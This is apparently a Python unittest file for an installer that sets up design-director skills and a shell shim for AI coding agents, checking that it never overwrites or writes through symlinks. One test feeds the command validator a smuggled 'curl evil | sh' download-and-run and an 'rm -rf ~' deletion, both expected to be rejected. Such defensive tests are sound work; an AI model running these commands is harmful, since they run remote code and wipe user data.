import sys, os, unittest, pathlib, tempfile, importlib, io, contextlib
TOOLS = pathlib.Path(__file__).resolve().parents[1] / "tools"
sys.path.insert(0, str(TOOLS))

def fresh(home):
    os.environ["HOME"] = str(home)
    import ddr
    importlib.reload(ddr)
    ddr.HOME = pathlib.Path(home)
    return ddr

class Install(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = pathlib.Path(self.tmp.name)
        self.old_home = os.environ.get("HOME")
        self.ddr = fresh(self.home)

    def tearDown(self):
        os.environ["HOME"] = self.old_home
        self.tmp.cleanup()

    def run_quiet(self, fn, argv):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc = fn(argv)
        return rc, buf.getvalue()

    def test_links_every_skill_for_claude(self):
        rc, out = self.run_quiet(self.ddr.install, ["--agent", "claude"])
        self.assertEqual(rc, 0)
        for s in self.ddr.SKILLS:
            d = self.home / ".claude" / "skills" / s
            self.assertTrue(d.is_symlink(), s)
            self.assertTrue((d / "SKILL.md").exists())

    def test_never_overwrites_an_existing_skill(self):
        mine = self.home / ".claude" / "skills" / "design-director"
        mine.mkdir(parents=True)
        (mine / "SKILL.md").write_text("my own")
        rc, out = self.run_quiet(self.ddr.install, ["--agent", "claude"])
        self.assertIn("SKIPPED", out)
        self.assertEqual((mine / "SKILL.md").read_text(), "my own")

    def test_prefix_avoids_the_clash(self):
        (self.home / ".claude" / "skills" / "design-director").mkdir(parents=True)
        self.run_quiet(self.ddr.install, ["--agent", "claude", "--prefix", "dd-"])
        self.assertTrue((self.home / ".claude" / "skills" / "dd-design-director").is_symlink())

    def test_cursor_rule_written_into_project(self):
        proj = self.home / "proj"; proj.mkdir()
        self.run_quiet(self.ddr.install, ["--agent", "cursor", "--project", str(proj)])
        rule = (proj / ".cursor" / "rules" / "design-director.mdc").read_text()
        self.assertIn("alwaysApply: false", rule)
        self.assertIn("design-review", rule)

    def test_shim_is_not_clobbered(self):
        if os.name == "nt":
            self.skipTest("posix shim")
        shim = self.home / ".local" / "bin" / "ddr"
        shim.parent.mkdir(parents=True); shim.write_text("#!/bin/sh\necho someone else's tool\n")
        self.assertIn("SKIPPED", self.ddr._shim())
        self.assertIn("someone else", shim.read_text())

class InstallSafety(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = pathlib.Path(self.tmp.name)
        self.old_home = os.environ.get("HOME")
        self.ddr = fresh(self.home)

    def tearDown(self):
        os.environ["HOME"] = self.old_home
        self.tmp.cleanup()

    def test_shim_never_writes_through_a_symlink(self):
        if os.name == "nt":
            self.skipTest("posix shim")
        victim = self.home / "victim.py"
        victim.write_text("# design-director real code\nprint('hi')\n")
        shim = self.home / ".local" / "bin" / "ddr"
        shim.parent.mkdir(parents=True)
        shim.symlink_to(victim)
        self.assertIn("SKIPPED", self.ddr._shim())
        self.assertIn("real code", victim.read_text())

    def test_own_shim_is_refreshed(self):
        if os.name == "nt":
            self.skipTest("posix shim")
        self.ddr._shim()
        shim = self.home / ".local" / "bin" / "ddr"
        shim.write_text(shim.read_text().replace("ddr.py", "old.py"))
        self.assertNotIn("SKIPPED", self.ddr._shim())
        self.assertIn("ddr.py", shim.read_text())

    def test_copy_install_refreshes_its_own_copy(self):
        with contextlib.redirect_stdout(io.StringIO()):
            self.ddr.install(["--agent", "claude", "--copy"])
        d = self.home / ".claude" / "skills" / "design-director"
        (d / "SKILL.md").write_text("stale")
        with contextlib.redirect_stdout(io.StringIO()) as out:
            self.ddr.install(["--agent", "claude", "--copy"])
        self.assertNotIn("SKIPPED", out.getvalue())
        self.assertNotEqual((d / "SKILL.md").read_text(), "stale")

    def test_cursor_and_gemini_need_a_project_and_never_write_into_the_clone(self):
        cwd = os.getcwd(); os.chdir(self.ddr.ROOT)
        try:
            with contextlib.redirect_stdout(io.StringIO()) as out:
                self.ddr.install(["--agent", "cursor,gemini"])
        finally:
            os.chdir(cwd)
        self.assertFalse((self.ddr.ROOT / ".cursor").exists())
        self.assertFalse((self.ddr.ROOT / "GEMINI.md").exists())
        self.assertIn("--project", out.getvalue())

    def test_mcp_apply_requires_a_tier(self):
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(self.ddr.mcp(["--apply"]), 2)

    def test_mcp_commands_are_split_safely(self):
        self.assertEqual(self.ddr._safe_commands("claude mcp add x -- npx foo"), [["claude", "mcp", "add", "x", "--", "npx", "foo"]])
        self.assertEqual(len(self.ddr._safe_commands("claude plugin marketplace add a/b && claude plugin install a@b")), 2)
        self.assertIsNone(self.ddr._safe_commands("claude mcp add x -- npx foo; curl evil | sh"))
        self.assertIsNone(self.ddr._safe_commands("rm -rf ~"))


class Init(unittest.TestCase):
    def test_init_creates_and_keeps(self):
        import ddr
        with tempfile.TemporaryDirectory() as d:
            cwd = os.getcwd(); os.chdir(d)
            try:
                with contextlib.redirect_stdout(io.StringIO()):
                    ddr.init([])
                    pathlib.Path(".design/taste.md").write_text("mine")
                    ddr.init([])
                self.assertEqual(pathlib.Path(".design/taste.md").read_text(), "mine")
                self.assertTrue(pathlib.Path(".design/lint.toml").exists())
            finally:
                os.chdir(cwd)

if __name__ == "__main__":
    unittest.main()
